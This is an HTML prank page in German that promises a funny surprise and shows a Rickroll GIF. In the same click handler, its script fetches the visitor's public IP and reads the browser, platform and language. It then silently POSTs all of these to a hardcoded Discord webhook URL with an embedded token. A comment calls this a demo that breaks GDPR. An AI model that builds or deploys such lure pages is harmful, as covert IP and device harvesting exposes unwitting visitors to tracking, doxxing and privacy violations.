<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fisch</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background-color: #5674a3;
            margin: 0;
            padding: 0;
            color: white;
        }

        h1 {
            margin-top: 50px;
        }

        button {
            padding: 10px 20px;
            font-size: 18px;
            background-color: #674580;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }

        button:hover {
            background-color: #af7dd4;
        }

        #gif-container, #info {
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <h1>Klicke den Knopf um etwas witziges zu sehen</h1>
    <button onclick="playGif()">Klick mich</button>
    <div id="gif-container"></div>
    <div id="info"></div>

    <script>
        function playGif() {
            const gifUrl = "https://c.tenor.com/x8v1oNUOmg4AAAAd/rickroll-roll.gif";
            const gifContainer = document.getElementById("gif-container");
            gifContainer.innerHTML = `<img src="${gifUrl}" alt="Rick Roll GIF" width="400">`;

            const infoDiv = document.getElementById("info");
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;

            fetch("https://api.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    const fullInfo = `
                        <p><strong>Deine IP:</strong> ${ip}</p>
                        <p><strong>System:</strong> ${platform}</p>
                        <p><strong>Browser:</strong> ${userAgent}</p>
                        <p><strong>Sprache:</strong> ${language}</p>
                    `;
                    infoDiv.innerHTML = fullInfo;

                    // Discord Webhook (nur für Demo-Zwecke)
                    const webhookUrl = "https://discord.com/api/webhooks/1366096941276205187/JfPcRLToJjK1u_tdWogf6jbJczFqNIrzf-6ohbfLAIrDanj1Bm_LCVU85TzyUmUHluNl";

                    // Sende automatisch für Demo (nicht DSGVO-konform!)
                    fetch(webhookUrl, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify({
                            content: `Neue Demo-Info:\nIP: ${ip}\nPlattform: ${platform}\nBrowser: ${userAgent}\nSprache: ${language}`
                        }),
                    });
                })
                .catch(error => console.error("Fehler beim Abrufen der IP:", error));
        }
    </script>
</body>
</html>
